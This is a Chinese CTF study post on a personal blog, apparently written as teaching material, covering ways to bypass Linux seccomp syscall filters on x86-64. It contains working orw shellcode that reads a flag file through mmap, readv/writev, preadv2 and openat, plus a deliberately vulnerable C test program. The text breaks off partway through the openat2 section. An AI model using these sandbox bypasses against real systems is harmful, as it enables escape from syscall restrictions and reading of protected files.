<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/31/seccomp%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/31/seccomp%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">seccomp学习 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-31 09:59:09" itemprop="dateCreated datePublished" datetime="2023-10-31T09:59:09+08:00">2023-10-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-03 15:43:26" itemprop="dateModified" datetime="2023-11-03T15:43:26+08:00">2023-11-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/seccomp-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">seccomp 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>7.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本文中，我们来讨论一下近年来针对seccomp的绕过姿势。本文仅讨论x86-64平台。（来货了来货了）</p>
<h1 id="0x01-execve"><a class="markdownIt-Anchor" href="#0x01-execve"></a> 0x01. execve</h1>
<p>这个是最为简单的一类题型，不能直接获得shell，但是可以通过open、read、write三个系统调用将flag文件首先保存到内存之中再输出到控制台。</p>
<p>下面的代码是在内存中不存在&quot;./flag&quot;字符串的情况下绕过execve的orw shellcode：</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sys_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *filename, <span class="type">int</span> flags, <span class="type">umode_t</span> mode)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">sys_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">sys_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
<p>这里对于<code>read</code>和<code>write</code>函数的参数都不需要解释，对于<code>open</code>函数，<code>flags</code>参数表示以何种方式打开文件，0为只读，当<code>open</code>没有创建文件时，<code>mode</code>参数会被忽略，不过最好还是也传入0。</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* read size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_read</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* write size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_write</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h1 id="0x02-execve-read"><a class="markdownIt-Anchor" href="#0x02-execve-read"></a> 0x02. execve + read</h1>
<p>如果题目禁用了<code>read</code>系统调用，但没有禁用<code>open</code>，则可以通过<code>mmap</code>的系统调用将文件内容映射到内存中，再<code>write</code>。</p>
<p>需要注意的是，对于Linux系统调用，6个参数的传递寄存器分别为<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>。与Glibc的传参有所不同。</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">long</span> <span class="title function_">sys_mmap</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> prot, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">off_t</span> pgoff)</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 0x10000</span><br><span class="line">mov rsi, 0x1000</span><br><span class="line">mov rdx, 7</span><br><span class="line">push 0x12</span><br><span class="line">pop r10</span><br><span class="line">push 0x3</span><br><span class="line">pop r8</span><br><span class="line">xor r9, r9</span><br><span class="line">push SYS_mmap</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* write size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, 0x10000</span><br><span class="line">push SYS_write</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>注意，内核的<code>mmap</code>函数的<code>flag</code>参数和glibc的不太一样，0x10表示映射文件<code>MAP_FILE</code>，0x2表示私有映射<code>MAP_PRIVATE</code>，0x20表示匿名映射<code>MAP_ANONYMOUS</code>。这里需要使用<code>MAP_FILE | MAP_PRIVATE</code>才能完成映射。</p>
<p>上述代码可以成功攻击下面的C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>* space = mmap((<span class="type">void</span>*)<span class="number">0x600000000000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	read(<span class="number">0</span>, space, <span class="number">0x1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, arch)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, <span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">59</span>, <span class="number">2</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sock_filter)),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</span><br><span class="line">	</span><br><span class="line">	((<span class="type">void</span>(*)(<span class="type">void</span>))space)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-execve-read-write"><a class="markdownIt-Anchor" href="#0x03-execve-read-write"></a> 0x03. execve + read + write</h1>
<p>如果<code>read</code>和<code>write</code>都被禁用，我们又应该如何应对呢？不要急，这里给出最新版本Linux系统调用的64位系统调用号：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/syscalls/syscall_64.tbl">传送门</a></p>
<p>通过<code>pwn constgrep -c amd64 -m ^SYS</code>命令可以查看pwntools预先定义的所有32位与64位的系统调用号符号，这些符号可以用于pwntools脚本的汇编语言字符串中。</p>
<p>我们可以发现，系统调用表中还有<code>pread</code>、<code>pwrite</code>等似乎也可以进行读写的函数。下面就来详细分析一下这些系统调用：</p>
<h2 id="a-sys_pread64-nr17"><a class="markdownIt-Anchor" href="#a-sys_pread64-nr17"></a> A. sys_pread64 (nr=17)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pread</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> pos)</span>;</span><br></pre></td></tr></table></figure>
<p>该函数与<code>read</code>函数类似，但参数有4个，第4个为开始读的偏移位置，且使用<code>sys_pread64</code>函数读取完成后，文件指针不会改变。</p>
<h2 id="b-sys_write64-nr18-不可用"><a class="markdownIt-Anchor" href="#b-sys_write64-nr18-不可用"></a> B. sys_write64 (nr=18, 不可用)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwrite</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> pos)</span>;</span><br></pre></td></tr></table></figure>
<p><code>sys_write64</code>与<code>sys_read64</code>类似，函数写操作完成后，文件指针不会改变。但是对于写操作而言，标准输出不是普通的文件描述符，可以看做一个字符设备，指定<code>pos</code>时写操作会失败。已经经过试验测试得出，<code>sys_write64</code>不能将内存中的内容输出到控制台中。</p>
<h2 id="c-sys_readv-nr19"><a class="markdownIt-Anchor" href="#c-sys_readv-nr19"></a> C. sys_readv (nr=19)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">readv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br></pre></td></tr></table></figure>
<p><code>readv</code>函数实现了分散输入的功能，即将可以将一个文件描述符的内容写到多个内存缓冲区中。注意这里的“写入到多个内存缓冲区”指的是依次写入，第1个缓冲区写满之后才会接着文件后面的内容继续写第2个缓冲区。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> __user* iov_base;</span><br><span class="line">    <span class="type">__kernel_size_t</span> iov_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>vec</code>参数应该是<code>struct iovec</code>结构体的数组，而第三个参数<code>vlen</code>为数组的长度。<code>iovec</code>结构体中，<code>iov_base</code>为一个内存地址，<code>iov_len</code>为内存的长度。因此如果需要使用这个系统调用，需要首先构造<code>iovec</code>结构体实例。在pwn题中，我们只需要构造一个结构体实例即可。</p>
<h2 id="d-sys_writev-nr20"><a class="markdownIt-Anchor" href="#d-sys_writev-nr20"></a> D. sys_writev (nr=20)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br></pre></td></tr></table></figure>
<p><code>writev</code>函数实现了集中输出的功能，即将<code>iovec</code>结构体数组中的缓冲区内容集中输出到一个文件描述符中。</p>
<p>下面为使用<code>readv</code>函数和<code>writev</code>函数的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1    /* iov size */</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp-8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_readv</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1    /* iov size */</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp+8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_writev</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h2 id="e-sys_preadv-nr295"><a class="markdownIt-Anchor" href="#e-sys_preadv-nr295"></a> E. sys_preadv (nr=295)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                   <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数同时具有<code>pread</code>函数和<code>readv</code>函数的性质，使用<code>iovec*</code>结构体可完成分散输入，同时可设置偏移量且读取后不修改文件指针。其中<code>pos_l</code>指的是读取偏移的低32位，<code>pos_h</code>为高32位。</p>
<h2 id="f-sys_pwritev-nr296-不可用"><a class="markdownIt-Anchor" href="#f-sys_pwritev-nr296-不可用"></a> F. sys_pwritev (nr=296, 不可用)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                   <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数同时具有<code>pwrite</code>函数和<code>writev</code>函数的性质，这也意味着其无法向标准输出写入内容。</p>
<h2 id="g-sys_preadv2-nr327"><a class="markdownIt-Anchor" href="#g-sys_preadv2-nr327"></a> G. sys_preadv2 (nr=327)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">preadv2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<p>这个函数在参数上与<code>preadv</code>的区别是多了一个<code>flags</code>。这个<code>flags</code>的标志位主要针对一些效率、同步方面，直接填0即可。</p>
<h2 id="h-sys_pwritev2-nr328-不可用"><a class="markdownIt-Anchor" href="#h-sys_pwritev2-nr328-不可用"></a> H. sys_pwritev2 (nr=328, 不可用)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwritev2</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt,</span></span><br><span class="line"><span class="params">                <span class="type">off_t</span> offset, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<p>对于上述系统调用，可以参考<a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/preadv2.2.html">资料</a>进行学习。</p>
<h1 id="0x04-execve-open"><a class="markdownIt-Anchor" href="#0x04-execve-open"></a> 0x04. execve + open</h1>
<p>上述所有读写的系统调用都需要使用文件描述符，但如果禁用了<code>open</code>系统调用，又应该如何获取文件描述符呢？好在，还有其他的系统调用能够获取文件描述符。</p>
<h2 id="a-openat-nr257"><a class="markdownIt-Anchor" href="#a-openat-nr257"></a> A. openat (nr=257)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);</span><br></pre></td></tr></table></figure>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_38090681/article/details/103056884">资料</a>，函数的第一个参数<code>dfd</code>指的是当<code>path</code>为相对路径时，该路径在文件系统中的开始地址（即打开目录获取的文件描述符），但可以指定其为<code>AT_FDCWD</code>(-100)，指定路径为当前路径。另外3个参数与<code>open</code>参数相同。<code>openat</code>的返回值与<code>open</code>相同，都是当前正未使用的最小的文件描述符值。</p>
<p>示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">xor rdi, rdi</span><br><span class="line">sub rdi, 100</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor r10, r10</span><br><span class="line">push SYS_openat</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 3</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp-8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov rdx, 1</span><br><span class="line">xor r10, r10</span><br><span class="line">xor r8, r8</span><br><span class="line">push SYS_preadv2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0x1</span><br><span class="line">pop rdx</span><br><span class="line">push 0x100</span><br><span class="line">lea rbx, [rsp+8]</span><br><span class="line">push rbx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_writev</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h2 id="b-openat2-nr437"><a class="markdownIt-Anchor" href="#b-openat2-nr437"></a> B. openat2 (nr=437)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">openat2</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span>* filename, <span class="keyword">struct</span> open_how* how, <span class="type">size_t</span> usize)</span>;</span><br></pre></td></tr></table></figure>
